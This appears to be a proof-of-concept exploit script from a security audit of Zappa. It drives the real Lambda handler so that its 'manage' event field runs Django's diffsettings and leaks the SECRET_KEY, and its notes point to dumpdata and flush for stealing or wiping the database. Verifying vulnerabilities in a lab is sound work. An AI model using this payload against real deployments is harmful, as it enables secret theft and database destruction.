#!/usr/bin/env python3
"""VULN-024 — `manage` event field -> Django call_command(*value.split(" ")) (command injection).

Vulnerable code : targets/Zappa/zappa/handler.py:922-939, sink :938 management.call_command(*event["manage"].split(" "))
Vulnerability   : CWE-77 Command Injection (into Django's management command surface).
Surface         : B (direct Lambda invocation) on a Django deployment; any-AWS-account via VULN-012.

Mechanism (plain English)
-------------------------
On a Django deployment the handler runs whatever management command the event
names, splitting the string on spaces into call_command args:

    from django.core import management
    get_django_wsgi(self.settings.DJANGO_SETTINGS)      # set up Django
    management.call_command(*event["manage"].split(" "))   # handler.py:938 — attacker-chosen command

`call_command` is Django's full management surface: `dumpdata` (dump the whole DB),
`flush` (wipe the DB), `diffsettings` (leak SECRET_KEY and all settings),
`createsuperuser`, `sqlmigrate`, etc. The event fully controls the command and its
(space-delimited) arguments.

Exploitation idea
-----------------
Invoke with `{"manage": "diffsettings"}` — Django prints every setting, including
the SECRET_KEY, proving arbitrary management-command execution. `dumpdata`/`flush`
give DB exfiltration / destruction on the same path.

What a successful run proves
----------------------------
Driving the real handler `manage` branch (with a minimal Django project) runs the
attacker-named management command and leaks the project SECRET_KEY.
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, ensure_lab_dep, lab_python, log, verdict

VULN = "VULN-024"

_DRIVER = r"""
import json, os, sys, io, secrets, types, contextlib
sfx = secrets.token_hex(4)
leaked = "django-insecure-SECRET-%s" % sfx
# A minimal Django settings module baked into the deployment (what DJANGO_SETTINGS points at).
open("/tmp/v024settings_%s.py" % sfx, "w").write(
    "SECRET_KEY=%r\n"
    "INSTALLED_APPS=['django.contrib.contenttypes','django.contrib.auth']\n"
    "DATABASES={'default':{'ENGINE':'django.db.backends.sqlite3','NAME':'/tmp/v024_%s.db'}}\n"
    "USE_TZ=True\n" % (leaked, sfx))
sys.path.insert(0, "/tmp")

from zappa.handler import LambdaHandler
lh = LambdaHandler.__new__(LambdaHandler)                       # fresh handler, Django-configured settings
lh.settings = types.SimpleNamespace(DEBUG=False, DJANGO_SETTINGS="v024settings_%s" % sfx)
class Ctx:
    def get_remaining_time_in_millis(self): return 30000

buf = io.StringIO()
with contextlib.redirect_stdout(buf):
    lh.handler({"manage": "diffsettings"}, Ctx())              # <-- REAL target code: manage branch -> call_command
out = buf.getvalue()
print(json.dumps({"secret_leaked": leaked in out,
                  "secret_line": [l for l in out.splitlines() if "SECRET_KEY" in l][:1]}))
"""


def main():
    banner(VULN, "manage event field -> Django call_command (command injection)",
           "zappa/handler.py:938 management.call_command(*event['manage'].split(' '))")

    log("SETUP", "ensuring Django is present in the lab container (models a Django deployment)")
    ensure_lab_dep("django")

    log("STEP", 'invoking the real handler with {"manage": "diffsettings"} on a minimal Django project')
    cp = lab_python(_DRIVER)
    if cp.returncode != 0:
        log("FAIL", "driver error:\n" + cp.stderr.decode()[-800:])
        verdict("FAILED", f"{VULN}: FAILED")
        return 1
    res = json.loads(cp.stdout.decode().strip().splitlines()[-1])
    log("INFO", f"leaked SECRET_KEY line: {res['secret_line']}")

    if res["secret_leaked"]:
        log("PROOF", "the attacker-controlled `manage` string reached management.call_command, which ran "
                     "`diffsettings` and printed the project's SECRET_KEY — arbitrary Django management-command "
                     "execution (the same path gives `dumpdata` DB exfil and `flush` DB wipe).")
        log("OK", "exploit confirmed — manage -> call_command executes attacker-chosen Django commands")
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — event `manage` -> call_command (SECRET_KEY leaked via diffsettings)")
        return 0
    log("FAIL", "SECRET_KEY not observed in command output")
    verdict("FAILED", f"{VULN}: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
